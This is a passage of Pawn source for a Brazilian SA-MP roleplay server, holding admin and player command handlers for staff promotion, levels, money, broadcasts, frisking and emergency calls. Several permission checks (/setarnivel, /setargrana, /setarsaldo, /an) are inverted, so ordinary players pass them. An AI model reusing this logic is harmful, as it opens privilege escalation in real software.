	    	{
			    SendClientMessage(playerid, 0x1E90FFAA, "Uso válido: /clima [ID do clima]");
			    return 1;
	    	}
            format(string, sizeof(string), "Você alterou o clima para o ID %d", clima);
            SendClientMessage(playerid, 0x1E90FFAA, string);
	    	SetWeather(clima);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
	if(strcmp(cmd, "/limparchat", true) == 0 || strcmp(cmd, "/lc", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
            GetPlayerName(playerid, sendername, sizeof(sendername));
            LimparChatTodos(150);
            format(string, sizeof(string), "%s limpou o chat.", sendername);
            SendClientMessageToAll(AZUL_WE, string);
		}
		return 1;
	}
	if(!strcmp(cmd, "/admins", true) || !strcmp(cmd, "/mods", true) || !strcmp(cmd, "/administradores", true) || !strcmp(cmd, "/moderadores", true))
	{
	    SendClientMessage(playerid, AZUL_WE, "Equipe {FF1E1E}WE{1E90FF} online:");
        new
			adml, adm, mdr, hlp, crg
		;
        foreach(Player, i)
        {
			if(WE_GetInt(f(i), "AdminL") == 1)
			{
				if(aInfo[i][Oculto] == false)
				{
				    adml ++;
 					format(string, sizeof(string), "{FF1E1E}%s [%d] {FFFFFF}- Cargo: {1E90FF}Dono(a)", PlayerName(i), i);
 					SendClientMessage(playerid, VERMELHO_WE, string);
				}
			}
			if(aInfo[i][Admin] == 1 && WE_GetInt(f(i), "AdminL") == 0)
			{
				if(aInfo[i][Oculto] == false)
				{
				    adm ++;
 					format(string, sizeof(string), "{FF1E1E}%s [%d] {FFFFFF}- Cargo: {FF1E1E}Administrador(a)", PlayerName(i), i);
 					SendClientMessage(playerid, VERMELHO_WE, string);
				}
			}
  			if(aInfo[i][Moderador] == 1 && WE_GetInt(f(i), "AdminL") == 0)
			{
				if(aInfo[i][Oculto] == false)
				{
				    mdr ++;
 					format(string, sizeof(string), "{1E90FF}%s [%d] {FFFFFF}- Cargo: {1E90FF}Moderador(a)", PlayerName(i), i);
 					SendClientMessage(playerid, AZUL_WE, string);
				}
			}
   			if(aInfo[i][Ajudante] == 1 && WE_GetInt(f(i), "AdminL") == 0)
			{
				if(aInfo[i][Oculto] == false)
				{
				    hlp ++;
 					format(string, sizeof(string), "{1E90FF}%s [%d] {FFFFFF}- Cargo: {1E90FF}Ajudante", PlayerName(i), i);
 					SendClientMessage(playerid, AZUL_WE, string);
				}
			}
   			if(aInfo[i][Corregedor] == 1 && WE_GetInt(f(i), "AdminL") == 0)
			{
				if(aInfo[i][Oculto] == false)
				{
				    crg ++;
 					format(string, sizeof(string), "{1E90FF}%s [%d] {FFFFFF}- Cargo: {8000FF}Corregedor(a)", PlayerName(i), i);
 					SendClientMessage(playerid, AZUL_WE, string);
				}
			}
        }
        if(adm == 0 && mdr == 0 && adml == 0 && hlp == 0 && crg == 0) return SendClientMessage(playerid, VERMELHO_WE, "Nenhum membro da equipe {1E90FF}WE{FF1E1E} conectado no momento.");
		return 1;
	}
	if(!strcmp(cmd, "/setar", true))
	{
        new pname[MAX_PLAYER_NAME];
        GetPlayerName(playerid,pname,sizeof(pname));
		if(WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
		{
		    return SendClientMessage(playerid, 0xFF0000AA, "Comando inexistente, use: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos");
		}
		tmp = strtok(cmdtext, idx);
  		if(!strlen(tmp))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [dono/admin/mod/ajud/correg] [ID]");
			return 1;
		}
		else if(!strcmp(tmp, "dono", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [dono] [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(aInfo[id][AdminL] == 0)
			{
				format(gstring, sizeof(gstring), "Você tornou %s um(a) dono(a).", PlayerName(id));
				SendClientMessage(playerid, AZUL_WE, gstring);
   				format(gstring, sizeof(gstring), "Parabéns! Você é um dos novos donos do servidor, promovido(a) por %s.", PlayerName(playerid));
				SendClientMessage(id, AZUL_WE, gstring);
				WE_SetInt(f(id), "AdminL", 1);
				WE_SaveFile();
				aInfo[id][AdminL] = 1;
			}
			else if(aInfo[id][AdminL] == 1)
			{
 				format(gstring, sizeof(gstring), "Você removeu %s da liderança do servidor.", PlayerName(id));
				SendClientMessage(playerid, VERMELHO_WE, gstring);
   				format(gstring, sizeof(gstring), "%s lhe retirou da liderança do servidor.", PlayerName(playerid));
				SendClientMessage(id, VERMELHO_WE, gstring);
				WE_SetInt(f(id), "AdminL", 0);
				WE_SaveFile();
				aInfo[id][AdminL] = 0;
			}
			return 1;
		}
		else if(!strcmp(tmp, "admin", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [admin] [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(aInfo[id][Admin] == 0)
			{
				format(gstring, sizeof(gstring), "Você tornou %s um(a) administrador(a).", PlayerName(id));
				SendClientMessage(playerid, AZUL_WE, gstring);
   				format(gstring, sizeof(gstring), "Parabéns! Você é o(a) novo(a) administrador(a) do servidor, promovido(a) por %s.", PlayerName(playerid));
				SendClientMessage(id, AZUL_WE, gstring);
				WE_SetInt(f(id), "Administrador", 1);
				WE_SaveFile();
				aInfo[id][Admin] = 1;
			}
			else if(aInfo[id][Admin] == 1)
			{
 				format(gstring, sizeof(gstring), "Você removeu %s da administração do servidor.", PlayerName(id));
				SendClientMessage(playerid, VERMELHO_WE, gstring);
   				format(gstring, sizeof(gstring), "%s lhe retirou da administração do servidor.", PlayerName(playerid));
				SendClientMessage(id, VERMELHO_WE, gstring);
				WE_SetInt(f(id), "Administrador", 0);
				WE_SaveFile();
				aInfo[id][Admin] = 0;
			}
			return 1;
		}
		else if(!strcmp(tmp, "mod", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [mod] [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
   			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(aInfo[id][Moderador] == 0)
			{
				format(gstring, sizeof(gstring), "Você tornou %s um(a) moderador(a).", PlayerName(id));
				SendClientMessage(playerid, AZUL_WE, gstring);
   				format(gstring, sizeof(gstring), "Parabéns! Você é o(a) novo(a) moderador(a) do servidor, promovido(a) por %s.", PlayerName(playerid));
				SendClientMessage(id, AZUL_WE, gstring);
				WE_SetInt(f(id), "Moderador", 1);
				WE_SaveFile();
				aInfo[id][Moderador] = 1;
			}
			else if(aInfo[id][Moderador] == 1)
			{
   				format(gstring, sizeof(gstring), "Você removeu %s da moderação do servidor.", PlayerName(id));
				SendClientMessage(playerid, VERMELHO_WE, gstring);
   				format(gstring, sizeof(gstring), "%s lhe retirou da moderação do servidor.", PlayerName(playerid));
				SendClientMessage(id, VERMELHO_WE, gstring);
				WE_SetInt(f(id), "Moderador", 0);
				WE_SaveFile();
				aInfo[id][Moderador] = 0;
			}
			return 1;
		}
		else if(!strcmp(tmp, "ajud", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [ajud] [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
   			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(aInfo[id][Ajudante] == 0)
			{
				format(gstring, sizeof(gstring), "Você tornou %s um(a) ajudante.", PlayerName(id));
				SendClientMessage(playerid, AZUL_WE, gstring);
   				format(gstring, sizeof(gstring), "Parabéns! Você é o(a) novo(a) ajudante do servidor, promovido(a) por %s.", PlayerName(playerid));
				SendClientMessage(id, AZUL_WE, gstring);
				WE_SetInt(f(id), "Ajudante", 1);
				WE_SaveFile();
				aInfo[id][Ajudante] = 1;
			}
			else if(aInfo[id][Ajudante] == 1)
			{
   				format(gstring, sizeof(gstring), "Você removeu %s do cargo de ajudante.", PlayerName(id));
				SendClientMessage(playerid, VERMELHO_WE, gstring);
   				format(gstring, sizeof(gstring), "%s lhe retirou o cargo de ajudante.", PlayerName(playerid));
				SendClientMessage(id, VERMELHO_WE, gstring);
				WE_SetInt(f(id), "Ajudante", 0);
				WE_SaveFile();
				aInfo[id][Ajudante] = 0;
			}
			return 1;
		}
		else if(!strcmp(tmp, "correg", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Setar [correg] [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
   			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(aInfo[id][Corregedor] == 0)
			{
				format(gstring, sizeof(gstring), "Você tornou %s um(a) corregedor(a).", PlayerName(id));
				SendClientMessage(playerid, AZUL_WE, gstring);
   				format(gstring, sizeof(gstring), "Parabéns! Você é o(a) novo(a) corregedor(a) do servidor, promovido(a) por %s.", PlayerName(playerid));
				SendClientMessage(id, AZUL_WE, gstring);
				WE_SetInt(f(id), "Corregedor", 1);
				WE_SaveFile();
				aInfo[id][Corregedor] = 1;
			}
			else if(aInfo[id][Corregedor] == 1)
			{
   				format(gstring, sizeof(gstring), "Você removeu %s da corregedoria do servidor.", PlayerName(id));
				SendClientMessage(playerid, VERMELHO_WE, gstring);
   				format(gstring, sizeof(gstring), "%s lhe retirou da corregedoria do servidor.", PlayerName(playerid));
				SendClientMessage(id, VERMELHO_WE, gstring);
				WE_SetInt(f(id), "Corregedor", 0);
				WE_SaveFile();
				aInfo[id][Corregedor] = 0;
			}
			return 1;
		}
		return 1;
	}
    if(!strcmp(cmd, "/setarnivel", true))
	{
        if(aInfo[playerid][Admin] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarnivel [ID] [Nível]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarnivel [ID] [Nível]");
	        	return 1;
	        }
            new
				level = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gStr, sizeof(gStr), "%s nível %d, teve os níveis setados para %d, por %s", PlayerName(id), pInfo[id][Level], level, PlayerName(playerid));
			log_setados_level(gStr);
			format(gstring, sizeof(gstring), "Você setou %d níveis para %s ~ Nível anterior %d", level, PlayerName(id), pInfo[id][Level]);
			SendClientMessage(playerid, 0x1E90FFAA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou %d níveis pra você.", PlayerName(playerid), level);
			SendClientMessage(id, 0x1E90FFAA, gstring);
			WE_SetInt(f(id), "Level", level);
			pInfo[id][Level] = level;
			SetPlayerScore(id, level);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}//
    if(!strcmp(cmd, "/setarcargo", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarcargo [ID] [Nível]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarcargo [ID] [Nível]");
	        	return 1;
	        }
            new
				cargo = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gStr, sizeof(gStr), "%s cargo nível %d, teve os níveis (de cargo) setados para %d, por %s", PlayerName(id), pCargo[id], cargo, PlayerName(playerid));
			log_setados_level(gStr);
			format(gstring, sizeof(gstring), "Você setou %d níveis (de cargo) para %s ~ Nível (de cargo) anterior %d", cargo, PlayerName(id), pCargo[id]);
			SendClientMessage(playerid, 0x1E90FFAA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou %d níveis (de cargo) pra você.", PlayerName(playerid), cargo);
			SendClientMessage(id, 0x1E90FFAA, gstring);
			WE_SetInt(f(id), "Cargo", cargo);
			pCargo[id] = cargo;
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}//
    if(!strcmp(cmd, "/setarpatente", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarpatente [ID] [Patentes]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarpatente [ID] [Patentes]");
	        	return 1;
	        }
            new
				patente = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gStr, sizeof(gStr), "%s patente %d, teve a patente setada para %d, por %s", PlayerName(id), pPatente[id], patente, PlayerName(playerid));
			log_setados_level(gStr);
			format(gstring, sizeof(gstring), "Você setou %d patentes para %s ~ Patente anterior %d", patente, PlayerName(id), pPatente[id]);
			SendClientMessage(playerid, 0x1E90FFAA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou %d patentes pra você.", PlayerName(playerid), patente);
			SendClientMessage(id, 0x1E90FFAA, gstring);
			WE_SetInt(f(id), "Patente", patente);
			pPatente[id] = patente;
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}//
    /*if(!strcmp(cmd, "/setarassaltos", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarassaltos [ID] [Assaltos]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarassaltos [ID] [Assaltos]");
	        	return 1;
	        }
            new
				assaltos = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gStr, sizeof(gStr), "%s com %d assaltos, teve o número de assaltos setados para %d, por %s", PlayerName(id), pAssaltos[id], assaltos, PlayerName(playerid));
			log_setados_level(gStr);
			format(gstring, sizeof(gstring), "Você setou %d assaltos para %s ~ Número anterior de assaltos %d", assaltos, PlayerName(id), pAssaltos[id]);
			SendClientMessage(playerid, 0x1E90FFAA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou %d patentes pra você.", PlayerName(playerid), assaltos);
			SendClientMessage(id, 0x1E90FFAA, gstring);
			WE_SetInt(f(id), "Assaltos", assaltos);
			pAssaltos[id] = assaltos;
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}*/
    if(!strcmp(cmd, "/setarporte", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarporte [ID] [Nível]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gstring, sizeof(gstring), "Você setou um porte de armas para %s", PlayerName(id));
			SendClientMessage(playerid, 0x00FF00AA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou um porte de armas para você.", PlayerName(playerid));
			SendClientMessage(id, 0x00FF00AA, gstring);
			WE_SetInt(f(id), "HabP", 1);
			pInfo[id][HabP] = 1;
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
    if(!strcmp(cmd, "/dargrana", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /dargrana [ID] [Quantia]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /dargrana [ID] [Quantia]");
	        	return 1;
	        }
            new
				grana = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
	      	format(gstring, sizeof(gstring), "Você deu R$%d de grana para %s", grana, PlayerName(id));
	       	SendClientMessage(playerid, AZUL_WE, gstring);
	     	format(gstring, sizeof(gstring), "O(A) administrador(a) %s deu R$%d de grana para você.", PlayerName(playerid), grana);
      		SendClientMessage(id, AZUL_WE, gstring);
 			sGivePlayerCash(id, grana);
			format(gstring, sizeof(gstring), "* %s deu R$%d de grana para %s", PlayerName(playerid), grana, PlayerName(id));
			LogSetGrana(gstring);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
    if(!strcmp(cmd, "/setargrana", true))
	{
        if(aInfo[playerid][Admin] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setargrana [ID] [Quantia]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setargrana [ID] [Quantia]");
	        	return 1;
	        }
            new
				grana = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
	   		format(gstring, sizeof(gstring), "Você setou R$%d de grana para %s - Grana anterior %d ", grana, PlayerName(id), GetPlayerCash(id));
	      	SendClientMessage(playerid, 0x00FF00AA, gstring);
	      	format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou R$%d de grana para você.", PlayerName(playerid), grana);
	    	SendClientMessage(id, 0x00FF00AA, gstring);
	   		sResetPlayerCash(id);
	      	sGivePlayerCash(id, grana);
			format(gstring, sizeof(gstring), "%s setou a grana de %s para R$%d", PlayerName(playerid), PlayerName(id), grana);
			LogSetGrana(gstring);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
    if(!strcmp(cmd, "/setarsaldo", true))
	{
        if(aInfo[playerid][Admin] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarsaldo [ID] [Quantia]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarsaldo [ID] [Quantia]");
	        	return 1;
	        }
            new
				quantia = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			format(gstring, sizeof(gstring), "Você setou o saldo de %s para: R$%d", PlayerName(id), quantia);
			SendClientMessage(playerid, 0x00FF00AA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou seu saldo para: R$%d", PlayerName(playerid), quantia);
			SendClientMessage(id, 0x00FF00AA, gstring);
			WE_SetInt(f(id), "SaldoBanco", WE_GetInt(f(id), "SaldoBanco") + quantia);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/an", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
		{
			strmid(tmp, cmdtext, 3, strlen(cmdtext));
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /An [Mensagem]");
				return 1;
			}
			format(gstring, sizeof(gstring), "%s", tmp);
			GameTextForAll(gstring, 7000, 5);
	 	}
	 	else
	 	{
	 	    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	 	}
	 	return 1;
 	}
    if(!strcmp(cmd, "/meunivel", true))
    {
  		new
			ano, mes, dia, hora, minuto, segundo
		;
		getdate(ano, mes, dia);
		gettime(hora, minuto, segundo);
		new
  			stg[512]
  		;
  		format(stg, sizeof(stg), "{1E90FF}Nome: {FFFFFF}%s\n{FFF000}Nível {FFFFFF}atual: {FFF000}%d\n{FFF000}Experiência {FFFFFF}acumulada: {FFF000}%d {FFFFFF}de {FFF000}6\n{FFF000}Cargo {FFFFFF}de transportes: {FFF000}%s\n{FFF000}Nível {FFFFFF}de assaltante: {FFF000}%s\n{1E90FF}Patente policial: {FFFFFF}%s", PlayerName(playerid), pInfo[playerid][Level], pInfo[playerid][Exp], NomeTrampo(playerid), NomeAssaltos(playerid), NomePatente(playerid));
		ShowPlayerDialog(playerid, 1457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Seu Nível", stg, "Fechar", "");
        return 1;
    }
    if(!strcmp(cmd, "/revistar", true))
    {
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO || aInfo[playerid][Admin] == 1)
	    {
	    	if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para revistar um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
	      	if(!strlen(tmp))
	    	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Revistar [ID]");
				return 1;
	     	}
	 		new
			 	id = strval(tmp)
		 	;
	      	if(!IsPlayerConnected(id))
	      	{
	          	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		      	return 1;
			}
			if(GetDistanceBetweenPlayers(playerid, id) > 15)
			{
          		SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja revistar está muito distânte de você!");
				return 1;
			}
			new
				rname[64]
			;
			format(rname, sizeof(rname), " Você está revistando o(a) jogador(a) %s ", PlayerName(id));
			SendClientMessage(playerid, COR_AZULCLARO, rname);

			format(gStr, sizeof(gStr), " Nível: {1E90FF}%d {FFFFFF} Dinheiro em mãos: {3DB134}R$%d", pInfo[id][Level], GetPlayerCash(id));
			SendClientMessage(playerid, COR_BRANCO, gStr);

			format(gstring, sizeof(gstring), " Portando %d parangas de maconha  %d pinos de cocaína  %d pedras de crack", pInfo[id][PT_Maconha], pInfo[id][PT_Cocaina], pInfo[id][PT_Crack]);
			SendClientMessage(playerid, VERMELHO_WE, gstring);

            new HTCarro[25], HTMoto[25], HTCaminhao[25], HNBarco[25], HAHeli[25], HAAviao[25], HTTrem[25];

	        if(pInfo[playerid][HabTCarro] == 1) { HTCarro = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTCarro] == 0) { HTCarro = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabTMoto] == 1) { HTMoto = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTMoto] == 0) { HTMoto = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabTCaminhao] == 1) { HTCaminhao = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTCaminhao] == 0) { HTCaminhao = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabNBarco] == 1) { HNBarco = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabNBarco] == 0) { HNBarco = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabAHeli] == 1) { HAHeli = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabAHeli] == 0) { HAHeli = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabAAviao] == 1) { HAAviao = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabAAviao] == 0) { HAAviao = "{FF1E1E}Não habilitado";}
	        if(pInfo[playerid][HabTTrem] == 1) { HTTrem = "{3DB134}Habilitado"; } else if(pInfo[playerid][HabTTrem] == 0) { HTTrem = "{FF1E1E}Não habilitado";}

			format(gstring, sizeof(gstring), " Hab. Carro: %s {FF1E1E} Hab. Moto: %s {FF1E1E} Hab. Caminhao: %s -{FF1E1E} Hab. Trem: %s", HTCarro, HTMoto, HTCaminhao, HTTrem);
			SendClientMessage(playerid, VERMELHO_WE, gstring);
			format(gstring, sizeof(gstring), " Hab. Barco: %s {FF1E1E} Hab. Heli: %s {FF1E1E} Hab. Avião: %s", HNBarco, HAHeli, HAAviao);
			SendClientMessage(playerid, VERMELHO_WE, gstring);

			if(trafcArma[id] == -1)
			{
			    SendClientMessage(playerid, 0x00FF00FF, " Não está portando armas contrabandeadas");
                SendClientMessage(playerid, AZUL_WE, "");
			}
			else
			{
			    format(gStr, 128, " Portando arma contrabandeada: {FF0000}%s", GetWeaponNameByID(trafcArma[id]));
				SendClientMessage(playerid, VERMELHO_WE, gStr);
				SendClientMessage(playerid, AZUL_WE, "");
			}
        }
        else
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
        }
        return 1;
    }
	if(!strcmp(cmd, "/taxi", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taxi [Local]");
			return 1;
		}
		else
		{
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taxi [Local]");
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_AMARELO, "Os(As) taxistas online foram informados(as)!");
				foreach(Player, i)
				{
					if(pInfo[i][Prof] == TAXISTA || aInfo[i][Admin] == 1 || pInfo[i][Prof] == MOTO_TAXISTA)
					{
						format(gStr, sizeof(gStr), "%s está precisando de um táxi no local: %s", PlayerName(playerid), result);
						SendClientMessage(i, COR_AMARELO, gStr);
					}
				}
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/190", true))
	{
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /190 [Denúncia]");
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_AMARELO, "Os(As) oficiais online foram informados!");
			foreach(Player, i)
			{
				if(pInfo[i][Prof] == GUARDA_TRANSITO || pInfo[i][Prof] == POL_CIVIL || pInfo[i][Prof] == POL_MILITAR || pInfo[i][Prof] == POL_RODOVIARIO || pInfo[i][Prof] == POL_FEDERAL || pInfo[i][Prof] == EXERCITO || aInfo[i][Admin] == 1)
				{
				    format(gstring, sizeof(gstring), "DENÚNCIA feita por: {FFFFFF}%s (ID %d)", PlayerName(playerid), playerid);
					SendClientMessage(i, COR_ERRO, gstring);
					format(gstring, sizeof(gstring), "MOTIVO: {0199FF}%s", result);
					SendClientMessage(i, 0x00FF00AA, gstring);
				}
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/192", true))
	{
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /192 [Sua situação/emergência]");
			return 1;
		}
		else
		{
			new
